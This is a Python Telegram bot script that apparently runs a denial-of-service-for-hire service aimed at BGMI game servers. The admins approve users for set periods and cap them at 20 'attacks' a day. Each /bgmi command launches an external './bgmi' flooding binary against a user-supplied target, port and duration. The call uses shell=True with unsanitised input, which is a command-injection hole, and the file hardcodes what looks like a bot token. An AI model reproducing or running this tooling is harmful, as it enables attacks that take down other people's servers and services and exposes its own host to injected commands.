#!/usr/bin/python3

import telebot
import subprocess
import datetime
import time
import re  

bot = telebot.TeleBot('7614008286:AAEvqf7u1Ba58tkZXr5DHk_rRrTbxsQ5VRs')

admin_id = ["1383324178", "6060545769", "1871909759"]

APPROVED_USERS_FILE = "approved_users.txt"
user_attacks = {}
reset_time = datetime.datetime.now().replace(hour=0, minute=0, second=0, microsecond=0) + datetime.timedelta(days=1)
MAX_ATTACKS_PER_DAY = 20

def reset_attack_counts():
    global reset_time, user_attacks
    if datetime.datetime.now() >= reset_time:
        user_attacks = {}
        reset_time = datetime.datetime.now().replace(hour=0, minute=0, second=0, microsecond=0) + datetime.timedelta(days=1)

def read_approved_users():
    approved_users = {}
    try:
        with open(APPROVED_USERS_FILE, "r") as file:
            for line in file:
                parts = line.strip().split(",")
                if len(parts) == 3:
                    user_id, approval_time, expiry_time = parts
                    approved_users[user_id] = expiry_time
    except FileNotFoundError:
        pass
    return approved_users

approved_users = read_approved_users()

def remove_expired_users():
    current_time = datetime.datetime.now()
    expired_users = []
    
    for user_id, expiry_time in approved_users.items():
        expiry_date = datetime.datetime.strptime(expiry_time, "%Y-%m-%d %H:%M:%S")
        if current_time >= expiry_date:
            expired_users.append(user_id)

    for user_id in expired_users:
        del approved_users[user_id]

    with open(APPROVED_USERS_FILE, "w") as file:
        for uid, expiry_time in approved_users.items():
            file.write(f"{uid},{expiry_time}\n")

def parse_duration(duration_str):
    days, hours = 0, 0
    day_match = re.search(r'(\d+)d', duration_str)
    hour_match = re.search(r'(\d+)h', duration_str)
    
    if day_match:
        days = int(day_match.group(1))
    if hour_match:
        hours = int(hour_match.group(1))
    
    return days, hours

@bot.message_handler(commands=['approve'])
def approve_user(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        bot.reply_to(message, "🚫 Only Admins Can Approve Users!")
        return

    command_parts = message.text.split()
    if len(command_parts) < 3:
        bot.reply_to(message, "⚠️ Usage: /approve <user_id> <duration>\nExample: /approve 123456789 3d2h")
        return

    target_user_id = command_parts[1]
    duration_str = command_parts[2]
    days, hours = parse_duration(duration_str)

    if days == 0 and hours == 0:
        bot.reply_to(message, "⚠️ Invalid duration format! Use 'd' for days and 'h' for hours. Example: 2d5h")
        return

    approval_time = datetime.datetime.now()
    expiry_time = approval_time + datetime.timedelta(days=days, hours=hours)
    expiry_time_str = expiry_time.strftime("%Y-%m-%d %H:%M:%S")

    approved_users[target_user_id] = expiry_time_str

    with open(APPROVED_USERS_FILE, "a") as file:
        file.write(f"{target_user_id},{expiry_time_str}\n")

    response = f"✅ User {target_user_id} approved!\n⏳ Duration: {days} days, {hours} hours\n📅 Expires on: {expiry_time_str}"
    bot.reply_to(message, response)

@bot.message_handler(commands=['mytime'])
def check_remaining_time(message):
    user_id = str(message.chat.id)

    if user_id not in approved_users:
        bot.reply_to(message, "🚫 You are not approved or your approval has expired.")
        return

    expiry_time = datetime.datetime.strptime(approved_users[user_id], "%Y-%m-%d %H:%M:%S")
    remaining_time = expiry_time - datetime.datetime.now()

    if remaining_time.total_seconds() <= 0:
        del approved_users[user_id]
        bot.reply_to(message, "🚫 Your approval has expired.")
    else:
        days, hours = divmod(remaining_time.total_seconds(), 86400)
        hours, minutes = divmod(hours, 3600)
        bot.reply_to(message, f"⏳ You have {int(days)} days, {int(hours)} hours, and {int(minutes)} minutes left.")

@bot.message_handler(commands=['deny'])
def deny_user(message):
    user_id = str(message.chat.id)

    if user_id not in admin_id:
        bot.reply_to(message, "🚫 Only Admins Can Deny Users!")
        return

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "⚠️ Usage: /deny <user_id>")
        return

    target_user_id = command_parts[1]

    if target_user_id in approved_users:
        del approved_users[target_user_id]
        with open(APPROVED_USERS_FILE, "w") as file:
            for uid, expiry_time in approved_users.items():
                file.write(f"{uid},{expiry_time}\n")

        bot.reply_to(message, f"❌ User {target_user_id} has been removed.")
    else:
        bot.reply_to(message, f"⚠️ User {target_user_id} is not in the approved list.")

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    reset_attack_counts()
    remove_expired_users()
    user_id = str(message.chat.id)

    if user_id not in approved_users:
        bot.reply_to(message, "🚫 You are not approved for attacks.")
        return

    if user_attacks.get(user_id, 0) >= MAX_ATTACKS_PER_DAY:
        bot.reply_to(message, "🚫 You have reached your daily limit of 20 attacks.")
        return

    command = message.text.split()
    if len(command) == 4:
        target, port, duration = command[1], int(command[2]), int(command[3])

        if duration > 300:
            bot.reply_to(message, "Error: Time must be less than 300 seconds.")
            return

        user_attacks[user_id] = user_attacks.get(user_id, 0) + 1
        remaining_attacks = MAX_ATTACKS_PER_DAY - user_attacks[user_id]

        bot.reply_to(message, f"🔥 Attack Started!\n🎯 Target: {target}\n🔢 Port: {port}\n⏳ Duration: {duration} seconds")

        for admin in admin_id:
            bot.send_message(admin, f"🚨 **Attack Alert** 🚨\n👤 **User ID:** {user_id}\n🎯 **Target:** {target}\n🔢 **Port:** {port}\n⏳ **Duration:** {duration} seconds\n🔥 **Remaining Attacks:** {remaining_attacks}/20")

        subprocess.run(f"./bgmi {target} {port} {duration}", shell=True)
        time.sleep(duration)
        bot.send_message(user_id, f"✅ Attack Finished!\n🎯 Target: {target}")

    else:
        bot.reply_to(message, "✅ Usage: /bgmi <target> <port> <time>")

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
